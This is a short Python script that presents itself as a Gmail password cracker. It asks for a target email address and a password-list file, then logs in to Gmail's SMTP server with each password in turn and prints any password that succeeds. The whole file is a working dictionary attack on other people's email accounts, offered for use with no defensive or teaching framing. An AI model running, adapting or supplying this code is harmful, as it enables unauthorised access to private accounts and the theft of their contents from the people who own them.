import smtplib
import json

colors = json.loads(open("colors.json", "r").read())
server = smtplib.SMTP("smtp.gmail.com", 587)
server.ehlo()
server.starttls()
server.ehlo()


print(colors["blue"], end = " ")
gmail_to_be_cracked = input("+] Enter the email address you want to crack [+] ==> " + colors["red"])
print(colors["blue"], end = " ")
password_list_file = input("[+] Enter the password list txt file path (Write its name if in the same directory) [+]  ==> " + colors["red"])

found_Password = False
for password in open(password_list_file, "r").read().split("\n"):
    print(colors["blue"], end = " ")
    print("trying password :: " + password)
    if found_Password == False:
        try:
            server.login(gmail_to_be_cracked, password)
            print(colors["yellow"], end = " ")
            print("[+] Password found :: " + password)
            found_Password = True
            break
        except smtplib.SMTPAuthenticationError as e:
            print(e)
            print(colors["red"], end = " ")
            print("[-] Password not found [-]")
if found_Password == False:
    print(colors["red"], end = " ")
    print("[-] Password not found [-]")



